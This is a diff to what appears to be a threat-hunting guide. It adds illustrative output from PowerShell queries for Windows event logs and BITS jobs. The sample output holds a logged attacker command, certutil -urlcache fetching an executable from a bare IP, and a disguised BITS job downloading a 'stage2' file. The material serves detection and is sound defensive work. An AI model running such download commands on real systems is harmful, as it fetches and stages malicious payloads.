@@ -117,6 +117,22 @@ Get-WinEvent -FilterHashtable @{
 # 2. Check BITS jobs queue for active persistent adversary downloads
 Get-BitsTransfer -AllUsers | Select-Object JobId, DisplayName, JobState, Priority, @{N='Files';E={$_.FileList.RemoteName}}
 ```
+Example output (illustrative values — your rows will differ):
+
+```text
+TimeCreated           Process                                 CommandLine                                                       Parent
+-----------           -------                                 -----------                                                       ------
+10/12/2026 9:32:10 AM C:\Windows\System32\certutil.exe        certutil.exe -urlcache -split -f http://198.51.100.7/a.txt a.exe  C:\...\powershell.exe
+
+JobId        : 2f6b9e1c-...
+DisplayName  : WindowsUpdateHelper
+JobState     : Transferred
+Priority     : Foreground
+Files        : http://198.51.100.7/stage2.bin
+```
+
+`certutil -urlcache` pulling an executable from a bare IP, and a BITS job with an official-sounding name downloading
+from the same IP, are one intrusion. Both commands need an elevated session (Security log, `-AllUsers`).
 
 ---
 
